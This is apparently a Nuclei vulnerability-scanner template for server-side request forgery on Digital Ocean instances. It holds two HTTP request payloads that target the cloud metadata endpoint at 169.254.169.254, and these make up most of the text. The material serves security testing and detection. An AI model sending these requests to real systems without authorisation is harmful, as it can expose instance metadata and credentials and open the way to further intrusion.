# Nuclei Template: Digital Ocean - Server-side request forgery (SSRF)
**Template ID:** digital-ocean-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** Critical
**CWE:** CWE-918
**Source:** Nuclei Template (`digital-ocean-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
Digital Ocean instance is vulnerable to SSRF.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/metadata/v1.json HTTP/1.1
Host: {{Hostname}}

@tls-sni: {{Hostname}}
GET http://169.254.169.254/metadata/v1.json HTTP/1.1
Host: {{Hostname}}
```

